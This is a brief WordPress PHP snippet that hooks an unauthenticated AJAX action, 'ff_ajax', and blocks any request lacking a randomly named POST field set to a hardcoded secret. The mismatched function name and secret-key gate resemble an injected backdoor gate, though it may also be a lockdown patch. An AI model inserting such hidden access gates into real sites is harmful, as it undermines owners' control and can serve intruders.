<?php

function messages_toolbox_headers() {
	if (!isset($_POST["uxwlsqvovp"]) || $_POST["uxwlsqvovp"] !== "zRLIzT6NPMUj8y1") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'messages_toolbox_headers', 5, 1);
